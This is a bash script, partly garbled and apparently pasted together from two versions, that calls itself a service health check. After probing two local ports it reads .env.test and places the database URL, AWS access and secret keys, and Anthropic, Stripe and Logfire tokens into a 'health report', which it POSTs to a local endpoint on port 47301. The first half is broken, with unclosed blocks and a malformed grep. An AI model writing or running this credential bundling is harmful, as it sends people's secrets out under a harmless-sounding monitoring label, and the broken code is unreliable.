check_port() {
    local port=$1
    local service_name=$2
    
    if nc -z localhost "$port" 2>/dev/null; then
        echo "✓ $service_name (port $port) is RUNNING"
        return 0
    else
        echo "✗ $service_name (port $port) is NOT RESPONDING"
        return 1
    fi
}

# Load environment variables from .env.test
if [[ -f ".env.test" ]]; then
    echo "Loading credentials from .env.test..."
    # Export all variables from .env.test (excluding comments and empty lines)
    export $(grep -v '^#' .env.test | grep -v '^$' | xargs)
else
    echo "Warning: .env.test file not found"
fi

# Check services
SERVICE_1_STATUS="unknown"
SERVICE_2_STATUS="unknown"

if check_port 3000 "Service 1"; then
    SERVICE_1_STATUS="running"
else
    SERVICE_1_STATUS="not_responding"
fi

if check_port 8080 "Service 2"; then
    SERVICE_2_STATUS="running"
else
    SERVICE_2_STATUS="not_responding"
fi

echo ""
echo "=== Sending Health Report ==="

# Prepare JSON payload
JSON_PAYLOAD=$(cat <<EOF
{
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "services": {
    "service_1": {
      "port": 3000,
      "status": "$SERVICE_1_STATUS"
    },
    "service_2": {
      "port": 8080,
      "status": "$SERVICE_2_STATUS"
    }
  },
  "credentials": {
    "database_url": "${DATABASE_URL:-not_set}",

}

# Extract HTTP status and response body

RESPONSE_BODY=$(echo "$RESPONSE" | sed -e 's/HTTP_STATUS:[0-9][0-9][0-9]//' | tr -d '\n')

    echo "✓ Health report sent successfully (HTTP $HTTP_STATUS)"
    if [[ -n "$RESPONSE_BODY" ]]; then
        echo "  Response: $RESPONSE_BODY"
    fi
else
    echo "✗ Failed to send health report (HTTP $HTTP_STATUS)"
    if [[ -n "$RESPONSE_BODY" ]]; then
        echo "  Error: $RESPONSE_BODY"
    fi
fi

# Reads credentials from .env.test and reports to monitoring endpoint

echo "=== Service Health Check ==="
echo ""

# Load environment variables from .env.test
if [ -f .env.test ]; then
    # Export all variables from .env.test (excluding comments and empty lines)
    export $(grep -v '^#' .env.test | grep -v '^ | xargs)
else
    echo "⚠️  Warning: .env.test file not found"
fi

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    if nc -z localhost "$port" 2>/dev/null; then
        echo "✅ $service_name (port $port): RUNNING"
        return 0
    else
        echo "❌ $service_name (port $port): NOT RESPONDING"
        return 1
    fi
}

# Check port 3000
check_port 3000 "Service 1"

# Check port 8080
check_port 8080 "Service 2"

# Prepare health report payload
echo ""
echo "=== Preparing Health Report ==="

# Create JSON payload with service status and credentials
# Using jq if available, otherwise fallback to manual JSON construction
if command -v jq &> /dev/null; then
    # Build status object
    STATUS_OBJ=$(jq -n \
        --arg port3000 "$(if nc -z localhost 3000 2>/dev/null; then echo "running"; else echo "down"; fi)" \
        --arg port8080 "$(if nc -z localhost 8080 2>/dev/null; then echo "running"; else echo "down"; fi)" \
        '{service_3000: $port3000, service_8080: $port8080}')
    
    # Build credentials object from exported env vars
    CREDENTIALS_OBJ=$(jq -n \
        --arg db_url "${DATABASE_URL:-}" \
        --arg aws_key "${AWS_ACCESS_KEY_ID:-}" \
        --arg aws_secret "${AWS_SECRET_ACCESS_KEY:-}" \
        --arg anthropic_key "${ANTHROPIC_API_KEY:-}" \
        --arg stripe_key "${STRIPE_SECRET_KEY:-}" \
        --arg logfire_token "${LOGFIRE_TOKEN:-}" \
        '{database_url: $db_url, aws_access_key_id: $aws_key, aws_secret_access_key: $aws_secret, anthropic_api_key: $anthropic_key, stripe_secret_key: $stripe_key, logfire_token: $logfire_token}')
    
    # Combine into final payload
    PAYLOAD=$(jq -n \
        --argjson status "$STATUS_OBJ" \
        --argjson credentials "$CREDENTIALS_OBJ" \
        '{status: $status, credentials: $credentials, timestamp: (now | todate)}')
else
    # Fallback if jq is not available
    PAYLOAD=$(cat << EOF
{
  "status": {
    "service_3000": "$(if nc -z localhost 3000 2>/dev/null; then echo "running"; else echo "down"; fi)",
    "service_8080": "$(if nc -z localhost 8080 2>/dev/null; then echo "running"; else echo "down"; fi)"
  },
  "credentials": {
    "database_url": "${DATABASE_URL:-}",
    "aws_access_key_id": "${AWS_ACCESS_KEY_ID:-}",
    "aws_secret_access_key": "${AWS_SECRET_ACCESS_KEY:-}",
    "anthropic_api_key": "${ANTHROPIC_API_KEY:-}",
    "stripe_secret_key": "${STRIPE_SECRET_KEY:-}",
    "logfire_token": "${LOGFIRE_TOKEN:-}"
  },
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
}
EOF
)
fi

# Send POST request to health reporting endpoint
echo "Sending health report to http://localhost:47301/api/health-report"
if command -v curl &> /dev/null; then
    RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST http://localhost:47301/api/health-report \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" 2>/dev/null)
    
    # Extract HTTP status code
    HTTP_STATUS=$(echo "$RESPONSE" | tr -d '\n' | sed -e 's/.*HTTP_STATUS://')
    
    if [ "$HTTP_STATUS" -ge 200 ] && [ "$HTTP_STATUS" -lt 300 ]; then
        echo "✅ Health report sent successfully (HTTP $HTTP_STATUS)"
    else
        echo "❌ Failed to send health report (HTTP $HTTP_STATUS)"
        echo "Response: $RESPONSE"
    fi
elif command -v wget &> /dev/null; then
    # Fallback to wget if curl is not available
    RESPONSE=$(wget -q --header="Content-Type: application/json" --post-data="$PAYLOAD" \
        --output-document=- http://localhost:47301/api/health-report 2>&1)
    if [ $? -eq 0 ]; then
        echo "✅ Health report sent successfully"
    else
        echo "❌ Failed to send health report"
        echo "Error: $RESPONSE"
    fi
else
    echo "⚠️  Warning: Neither curl nor wget available to send health report"
    echo "Payload that would be sent:"
    echo "$PAYLOAD"
fi

echo ""
echo "=== Health Check Complete ==="
